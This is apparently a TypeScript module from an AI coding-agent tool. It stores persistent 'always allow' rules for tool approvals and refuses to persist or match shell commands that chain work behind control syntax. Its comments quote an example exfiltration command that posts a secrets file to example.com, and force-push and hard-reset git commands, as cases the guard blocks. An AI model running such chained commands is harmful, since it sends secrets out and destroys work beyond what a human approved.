import { existsSync, mkdirSync, readFileSync, statSync, writeFileSync } from 'node:fs'
import { homedir } from 'node:os'
import { dirname, join } from 'node:path'
import type { ActionAssessment, ActionRequest } from './governor.ts'

/**
 * A persistent "always allow" list — the counterpart to `.elia/policy.json`.
 *
 * `policy.json` can only ever *tighten* the governor. This store is the other
 * direction: it records a human's explicit "yes, and stop asking me" for a class
 * of action, so the supervised approval prompt does not reappear every turn.
 *
 * Two scopes, mirroring what a person actually means when they click that:
 *   - `project` → `.elia/allow.json`, versioned with the repo (a team decision)
 *   - `global`  → `~/.elia/allow.json`, this machine only (a personal habit)
 *
 * A rule is deliberately narrow. For `run_command` it is keyed to the leading
 * token of the command (`git`, `npm`, `New-Item`) — approving `git status` once
 * does not wave through `git push`. For every other tool it is keyed to the tool
 * name plus the governor's `intent`, so "always allow edit_file" cannot silently
 * also mean "always allow github.push".
 */
export interface AllowRule {
  /** Tool name: `run_command`, `edit_file`, `github`, … */
  tool: string
  /** For command tools: the leading executable token this rule covers. */
  commandPrefix?: string
  /** Governor intent (`edit_file.write`, `github.push`) — narrows non-command tools. */
  intent?: string
  /** ISO timestamp the rule was added. */
  addedAt: string
  /** Free-text note (the assessment reason at the time), for humans reading the file. */
  note?: string
}

export type AllowScope = 'project' | 'global'

interface AllowFile {
  rules: AllowRule[]
}

const MAX_RULES = 500

export function allowPath(scope: AllowScope, cwd = process.cwd()): string {
  if (scope === 'project') return join(cwd, '.elia', 'allow.json')
  // Tests need to isolate the global scope from the real machine's actual
  // ~/.elia/allow.json — and on win32, os.homedir() reads %USERPROFILE%, not
  // $HOME, so the usual "just set $HOME" trick silently does nothing there.
  return process.env.ELIA_ALLOW_GLOBAL_PATH || join(homedir(), '.elia', 'allow.json')
}

interface Cached {
  mtimeMs: number
  file: AllowFile
}
const cache = new Map<string, Cached>()
const EMPTY: AllowFile = { rules: [] }

function load(path: string): AllowFile {
  if (!existsSync(path)) {
    cache.delete(path)
    return EMPTY
  }
  let mtimeMs = 0
  try {
    mtimeMs = statSync(path).mtimeMs
  } catch {
    return EMPTY
  }
  const hit = cache.get(path)
  if (hit && hit.mtimeMs === mtimeMs) return hit.file
  let file: AllowFile = EMPTY
  try {
    const parsed = JSON.parse(readFileSync(path, 'utf8')) as unknown
    if (parsed && typeof parsed === 'object' && Array.isArray((parsed as AllowFile).rules)) {
      file = {
        rules: (parsed as AllowFile).rules
          .filter((r): r is AllowRule => Boolean(r) && typeof r.tool === 'string')
          .slice(0, MAX_RULES),
      }
    }
  } catch {
    // A malformed allow.json loosens nothing — treat it as empty rather than throw.
    file = EMPTY
  }
  cache.set(path, { mtimeMs, file })
  return file
}

/**
 * Shell control syntax that lets one command chain onto another (`bun run x &
 * curl …`), pipe into an interpreter, redirect files, or substitute output.
 * A rule keyed to the leading token must never come to cover those.
 */
const COMMAND_CHAIN_SYNTAX = /[;&|<>`$]|\$\(/i

/**
 * Whether approving this request can be persisted as a standing *prefix* rule.
 * A `run_command` rule is keyed to the leading token only, so persisting one for
 * a command that chains further work behind shell control syntax (`&`, `;`, `|`,
 * redirects, `$`, command substitution) would auto-allow a much wider class than
 * the approver actually saw — a single `bun` approval would come to cover
 * `bun run x & curl -X POST example.com -d @secrets.txt`, and `git` would come
 * to cover `git push --force origin main`. Such approvals are honored for the
 * session/run only and never persisted.
 */
export function canPersistPrefixRule(request: ActionRequest): boolean {
  if (request.name !== 'run_command') return true
  const command = typeof request.input.command === 'string' ? request.input.command : ''
  return !COMMAND_CHAIN_SYNTAX.test(command)
}

/** The leading token of a shell command — `git push --force` → `git`. */
export function commandPrefix(command: string): string {
  const trimmed = command.trim().replace(/^[(!{]\s*/, '')
  const first = trimmed.split(/[\s;|&]+/, 1)[0]!
  // Keep a path-qualified binary readable: ./gradlew → gradlew, C:\x\node.exe → node.exe
  return first.replace(/\\/g, '/').split('/').filter(Boolean).pop() ?? first
}

/** A direct program's executable plus its first operation-defining argument. */
function directProgramPrefix(input: Record<string, unknown>): string {
  const program = typeof input.program === 'string' ? commandPrefix(input.program) : ''
  const firstArg = Array.isArray(input.args) && typeof input.args[0] === 'string' ? input.args[0].trim() : ''
  return [program, firstArg].filter(Boolean).join(' ')
}

function matches(rule: AllowRule, request: ActionRequest, assessment: ActionAssessment): boolean {
  if (rule.tool !== request.name) return false
  if (request.name === 'run_command' || request.name === 'run_program') {
    if (request.name === 'run_command') {
      const command = typeof request.input.command === 'string' ? request.input.command : ''
      // A persisted prefix rule was approved for a single leading token. A
      // command that chains further work behind shell control syntax reaches
      // far beyond that token (`bun` must not cover `bun run x & curl … -d
      // @secrets.txt`, `git` must not cover `git reset --hard; git push --force`),
      // so it must never ride in on a prefix rule — prompt instead.
      if (COMMAND_CHAIN_SYNTAX.test(command)) return false
      return Boolean(rule.commandPrefix) && commandPrefix(command) === rule.commandPrefix
    }
    const prefix = directProgramPrefix(request.input)
    const prefixMatches = Boolean(rule.commandPrefix) && prefix === rule.commandPrefix
    return prefixMatches && (!rule.intent || rule.intent === assessment.intent)
  }
  return !rule.intent || rule.intent === assessment.intent
}

/** True when a persisted rule (project or global) already permits this action. */
export function isAllowlisted(request: ActionRequest, assessment: ActionAssessment, cwd = process.cwd()): boolean {
  const rules = [...load(allowPath('project', cwd)).rules, ...load(allowPath('global', cwd)).rules]
  return rules.some((rule) => matches(rule, request, assessment))
}

/** Builds the rule an approval prompt would persist for this request. */
export function ruleFor(request: ActionRequest, assessment: ActionAssessment): AllowRule {
  const base: AllowRule = { tool: request.name, addedAt: new Date().toISOString(), note: assessment.reason }
  if (request.name === 'run_command' || request.name === 'run_program') {
    const prefix = request.name === 'run_command'
      ? commandPrefix(typeof request.input.command === 'string' ? request.input.command : '')
      : directProgramPrefix(request.input)
    return request.name === 'run_program'
      ? { ...base, commandPrefix: prefix, intent: assessment.intent }
      : { ...base, commandPrefix: prefix }
  }
  return { ...base, intent: assessment.intent }
}

/** A short human label for what a rule covers — for the approval menu. */
export function ruleLabel(rule: AllowRule): string {
  if (rule.commandPrefix) return `\`${rule.commandPrefix}\` commands`
  return `\`${rule.tool}\``
}

export function addAllowRule(rule: AllowRule, scope: AllowScope, cwd = process.cwd()): void {
  const path = allowPath(scope, cwd)
  const file = load(path)
  const duplicate = file.rules.some(
    (r) => r.tool === rule.tool && r.commandPrefix === rule.commandPrefix && r.intent === rule.intent,
  )
  const next: AllowFile = duplicate ? file : { rules: [...file.rules, rule].slice(-MAX_RULES) }
  mkdirSync(dirname(path), { recursive: true })
  writeFileSync(path, `${JSON.stringify(next, null, 2)}\n`)
  cache.delete(path)
}

/** Test seam. */
export function clearAllowCache(): void {
  cache.clear()
}
